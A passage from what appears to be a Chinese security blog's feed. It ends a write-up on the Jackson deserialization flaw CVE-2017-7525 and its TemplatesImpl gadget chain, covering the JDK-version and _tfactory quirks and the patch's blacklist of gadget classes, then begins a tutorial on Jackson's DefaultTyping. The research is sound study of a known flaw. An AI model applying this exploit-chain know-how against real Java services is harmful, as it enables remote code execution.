alt=""></p><p>由于此处_name为null，导致程序提前return了，并未进入后面生成Java了以及新建该Java类实例的代码中，从而也无法成功触发漏洞。</p><p>由前面调试分析可知，transletBytecodes和transletName属性值都是通过调用MethodProperty.deserializeAndSet()函数来反射调用其setter方法来设置的。</p><p>这里我们重新transletName属性带上，再次调试，跟进设置transletName属性值时的MethodProperty.deserializeAndSet()函数中，发现其调用的setter方法就是TemplatesImpl.setTransletName()函数：</p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/7.png" alt=""></p><p>因此这个属性值是必须的，不能为null。</p><h2 id="0x06-高版本JDK不能触发的原因——-tfactory"><a href="#0x06-高版本JDK不能触发的原因——-tfactory" class="headerlink" title="0x06 高版本JDK不能触发的原因——_tfactory"></a>0x06 高版本JDK不能触发的原因——_tfactory</h2><p>在大版本下，JDK1.7和1.8中，com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类是有所不同的。</p><p>当然，在小版本较高的1.7和某些1.8的还是能够成功触发的，具体的可自行测试。</p><p>在我本地的JDK 1.8.0_73 版本中，看到在TemplatesImpl.getTransletInstance()方法中调用了defineTransletClasses()函数来定义Java类，跟进看看：</p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/8.png" alt=""></p><p>区别在于新建TransletClassLoader类实例的代码，其中调用了<code>_factory</code>属性，但是该属性值我们没有在PoC中设置，默认为null，于是就会抛出异常了。</p><p>那么如何设置这个<code>_factory</code>属性呢？我们在PoC中随便填入如<code>&#39;_factory&#39;:{},</code>，会看到如下错误信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field &quot;_factory&quot; (class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl), not marked as ignorable (5 known properties: &quot;uriresolver&quot;, &quot;transletBytecodes&quot;, &quot;outputProperties&quot;, &quot;transletName&quot;, &quot;stylesheetDOM&quot;])</span><br></pre></td></tr></table></figure><p>可以看到，这个错误是Jackson.databind报的，说的是TemplatesImpl类已知的只有5个配置项，即”uriresolver”, “transletBytecodes”, “outputProperties”, “transletName”, “stylesheetDOM”。</p><p>在里面没有看到tfactory相关字样，也就是说，<strong>Jackson压根就不支持我们在序列化的TemplatesImpl类的内容上添加并解析_tfactory属性</strong>。</p><h2 id="0x07-补丁分析"><a href="#0x07-补丁分析" class="headerlink" title="0x07 补丁分析"></a>0x07 补丁分析</h2><p>这里将jackson-databind-2.7.9换成jackson-databind-2.7.9.1。</p><p>尝试运行会报错如下，显示因为某些安全原因禁止了该类的加载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.fasterxml.jackson.databind.JsonMappingException: Illegal type (com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl) to deserialize: prevented for security reasons</span><br></pre></td></tr></table></figure><p>调试分析，在调用BeanDeserializerFactory.createBeanDeserializer()函数创建Bean反序列化器的时候，其中会调用checkIllegalTypes()函数提取当前类名，然后使用黑名单进行过滤：</p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/9.png" alt=""></p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/10.png" alt=""></p><p>注意：实际调试的时候回调用两次BeanDeserializerFactory.createBeanDeserializer()-&gt;checkIllegalTypes()，第一次由于是Mi1k7ea类，因此不会被过滤；第二次是TemplatesImpl类，由于其在黑名单中，因此被过滤了。</p><p>在jackson-databind-2.7.9.1-sources.jar!/com/fasterxml/jackson/databind/deser/BeanDeserializerFactory.java中，存在默认的黑名单DEFAULT_NO_DESER_CLASS_NAMES，将TemplatesImpl类以及早期其他常用反序列化利用类都过滤了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    Set&lt;String&gt; s = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">    <span class="comment">// Courtesy of [https://github.com/kantega/notsoserial]:</span></span><br><span class="line">    <span class="comment">// (and wrt [databind#1599]</span></span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections.functors.InvokerTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections.functors.InstantiateTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections4.functors.InvokerTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections4.functors.InstantiateTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.codehaus.groovy.runtime.ConvertedClosure"</span>);</span><br><span class="line">    s.add(<span class="string">"org.codehaus.groovy.runtime.MethodClosure"</span>);</span><br><span class="line">    s.add(<span class="string">"org.springframework.beans.factory.ObjectFactory"</span>);</span><br><span class="line">    s.add(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">    DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>OK，17年经典的Jackson反序列化漏洞就说到这，利用链是和Fastjson一样的com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，两者的利用链很多都是可以共用的，但是会有些细微的区别。下一篇文章看看Jackson其他反序列化利用链及CVE漏洞。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson系列一——反序列化漏洞基本原理</title>
    <link href="https://www.mi1k7ea.com/2019/11/13/Jackson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"/>
    <id>https://www.mi1k7ea.com/2019/11/13/Jackson系列一——反序列化漏洞基本原理/</id>
    <published>2019-11-13T15:01:02.000Z</published>
    <updated>2019-11-16T08:52:26.763Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Jackson简介"><a href="#0x01-Jackson简介" class="headerlink" title="0x01 Jackson简介"></a>0x01 Jackson简介</h2><p>Jackson是一个开源的Java序列化和反序列化工具，可以将Java对象序列化为XML或JSON格式的字符串，以及将XML或JSON格式的字符串反序列化为Java对象。</p><p>由于其使用简单，速度较快，且不依靠除JDK外的其他库，被众多用户所使用。</p><h2 id="0x02-使用Jackson进行序列化和反序列化"><a href="#0x02-使用Jackson进行序列化和反序列化" class="headerlink" title="0x02 使用Jackson进行序列化和反序列化"></a>0x02 使用Jackson进行序列化和反序列化</h2><p>Jackson提供了ObjectMapper.writeValueAsString()和ObjectMapper.readValue()两个方法来实现序列化和反序列化的功能。</p><p>我本地测试用到的jar包：jackson-annotations-2.7.9，jackson-core-2.7.9，jackson-databind-2.7.9</p><p>定义Person类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s"</span>, age, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JSTest.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.age = <span class="number">6</span>;</span><br><span class="line">        p.name = <span class="string">"mi1k7ea"</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;age&quot;:6,&quot;name&quot;:&quot;mi1k7ea&quot;&#125;</span><br><span class="line">Person.age=6, Person.name=mi1k7ea</span><br></pre></td></tr></table></figure><h2 id="0x03-多态问题的解决——JacksonPolymorphicDeserialization"><a href="#0x03-多态问题的解决——JacksonPolymorphicDeserialization" class="headerlink" title="0x03 多态问题的解决——JacksonPolymorphicDeserialization"></a>0x03 多态问题的解决——JacksonPolymorphicDeserialization</h2><p>简单地说，Java多态就是同一个接口使用不同的实例而执行不同的操作。</p><p>那么问题来了，如果对多态类的某一个子类实例在序列化后再进行反序列化时，如何能够保证反序列化出来的实例即是我们想要的那个特定子类的实例而非多态类的其他子类实例呢？——Jackson实现了JacksonPolymorphicDeserialization机制来解决这个问题。</p><p>JacksonPolymorphicDeserialization即Jackson多态类型的反序列化：在反序列化某个类对象的过程中，如果类的成员变量不是具体类型（non-concrete），比如Object、接口或抽象类，则可以在JSON字符串中指定其具体类型，Jackson将生成具体类型的实例。</p><p>简单地说，就是将具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种，即DefaultTyping和@JsonTypeInfo注解。</p><p>下面具体介绍一下。</p><h3 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h3><p>Jackson提供一个enableDefaultTyping设置，其包含4个值，查看jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/ObjectMapper.java可看到相关介绍信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> DefaultTyping &#123;</span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * This value means that only properties that have</span></span><br><span class="line"><span class="comment">        * &#123;<span class="doctag">@link</span> java.lang.Object&#125; as declared type (including</span></span><br><span class="line"><span class="comment">        * generic types without explicit type) will use default</span></span><br><span class="line"><span class="comment">        * typing.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       JAVA_LANG_OBJECT,</span><br><span class="line">       </span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * properties with declared type of &#123;<span class="doctag">@link</span> java.lang.Object&#125;</span></span><br><span class="line"><span class="comment">        * or an abstract type (abstract class or interface).</span></span><br><span class="line"><span class="comment">        * Note that this does &lt;b&gt;not&lt;/b&gt; include array types.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       OBJECT_AND_NON_CONCRETE,</span><br><span class="line"></span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * all types covered by &#123;<span class="doctag">@link</span> #OBJECT_AND_NON_CONCRETE&#125;</span></span><br><span class="line"><span class="comment">        * plus all array types for them.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       NON_CONCRETE_AND_ARRAYS,</span><br><span class="line">       </span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * all non-final types, with exception of small number of</span></span><br><span class="line"><span class="comment">        * "natural" types (String, Boolean, Integer, Double), which</span></span><br><span class="line"><span class="comment">        * can be correctly inferred from JSON; as well as for</span></span><br><span class="line"><span class="comment">        * all arrays of non-final types.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       NON_FINAL</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><strong>默认情况下，即无参数的enableDefaultTyping是第二个设置，OBJECT_AND_NON_CONCRETE。</strong></p><p>下面分别对这几个选项进行说明。</p><h4 id="JAVA-LANG-OBJECT"><a href="#JAVA-LANG-OBJECT" class="headerlink" title="JAVA_LANG_OBJECT"></a>JAVA_LANG_OBJECT</h4><p>JAVA_LANG_OBJECT：当被序列化或反序列化的类里的属性被声明为一个Object类型时，会对该Object类型的属性进行序列化和反序列化，并且明确规定类名。（当然，这个Object本身也得是一个可被序列化的类）</p><p>添加一个com.mi1k7ea.Hacker类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String skill = <span class="string">"Jackson"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改Person类，添加Object类型属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改JSTest.java，添加enableDefaultTyping()并设置为JAVA_LANG_OBJECT：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.age = <span class="number">6</span>;</span><br><span class="line">        p.name = <span class="string">"mi1k7ea"</span>;</span><br><span class="line">        p.object = <span class="keyword">new</span> Hacker();</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        <span class="comment">// 设置JAVA_LANG_OBJECT</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span><br><span class="line">        </span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出对比看到，通过enableDefaultTyping()设置设置JAVA_LANG_OBJECT后，会多输出Hacker类名，且在输出的Object属性时直接输出的是Hacker类对象，也就是说同时对Object属性对象进行了序列化和反序列化操作：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 设置JAVA_LANG_OBJECT</span><br><span class="line">&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:[<span class="string">"com.mi1k7ea.Hacker"</span>,&#123;<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;]&#125;</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.Hacker@7f9a81e8</span><br><span class="line"></span><br><span class="line">// 未设置JAVA_LANG_OBJECT</span><br><span class="line">&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:&#123;<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;&#125;</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, &#123;skill=Jackson&#125;</span><br></pre></td></tr></table></figure><h4 id="OBJECT-AND-NON-CONCRETE"><a href="#OBJECT-AND-NON-CONCRETE" class="headerlink" title="OBJECT_AND_NON_CONCRETE"></a>OBJECT_AND_NON_CONCRETE</h4><p>OBJECT_AND_NON_CONCRETE：除了前面提到的特征，当类里有Interface、AbstractClass类时，对其进行序列化和反序列化（当然这些类本身需要时合法的、可被序列化的对象）。此外，<strong>enableDefaultTyping()默认的无参数的设置就是此选项。</strong></p><p>添加com.mi1k7ea.Sex接口类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加com.mi1k7ea.MySex类实现Sex接口类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改Person类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object, sex == <span class="keyword">null</span> ? <span class="string">"null"</span> : sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改JSTest.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.age = <span class="number">6</span>;</span><br><span class="line">        p.name = <span class="string">"mi1k7ea"</span>;</span><br><span class="line">        p.object = <span class="keyword">new</span> Hacker();</span><br><span class="line">        p.sex = <span class="keyword">new</span> MySex();</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        <span class="comment">// 设置OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br><span class="line">        <span class="comment">// 或直接无参调用，输出一样</span></span><br><span class="line">        <span class="comment">//mapper.enableDefaultTyping();</span></span><br><span class="line"></span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出，可以看到该Interface类属性被成功序列化和反序列化：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:[<span class="string">"com.mi1k7ea.Hacker"</span>,&#123;<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;],<span class="attr">"sex"</span>:[<span class="string">"com.mi1k7ea.MySex"</span>,&#123;<span class="attr">"sex"</span>:<span class="number">0</span>&#125;]&#125;</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.Hacker@62ee68d8, com.mi1k7ea.MySex@735b5592</span><br></pre></td></tr></table></figure><h4 id="NON-CONCRETE-AND-ARRAYS"><a href="#NON-CONCRETE-AND-ARRAYS" class="headerlink" title="NON_CONCRETE_AND_ARRAYS"></a>NON_CONCRETE_AND_ARRAYS</h4><p>NON_CONCRETE_AND_ARRAYS：除了前面提到的特征外，还支持Array类型。</p><p>下面直接修改JSTest.java，在Object属性中存在的是数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.age = <span class="number">6</span>;</span><br><span class="line">        p.name = <span class="string">"mi1k7ea"</span>;</span><br><span class="line">        Hacker[] hackers = <span class="keyword">new</span> Hacker[<span class="number">2</span>];</span><br><span class="line">        hackers[<span class="number">0</span>] = <span class="keyword">new</span> Hacker();</span><br><span class="line">        hackers[<span class="number">1</span>] = <span class="keyword">new</span> Hacker();</span><br><span class="line">        p.object = hackers;</span><br><span class="line">        p.sex = <span class="keyword">new</span> MySex();</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        <span class="comment">// 设置NON_CONCRETE_AND_ARRAYS</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);</span><br><span class="line"></span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，类名变成了”[L”+类名+”;”，序列化Object之后为数组形式，反序列化之后得到[Lcom.mi1k7ea.Hacker;类对象，说明对Array类型成功进行了序列化和反序列化：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:[<span class="string">"[Lcom.mi1k7ea.Hacker;"</span>,[&#123;<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;,&#123;<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;]],<span class="attr">"sex"</span>:[<span class="string">"com.mi1k7ea.MySex"</span>,&#123;<span class="attr">"sex"</span>:<span class="number">0</span>&#125;]&#125;</span><br><span 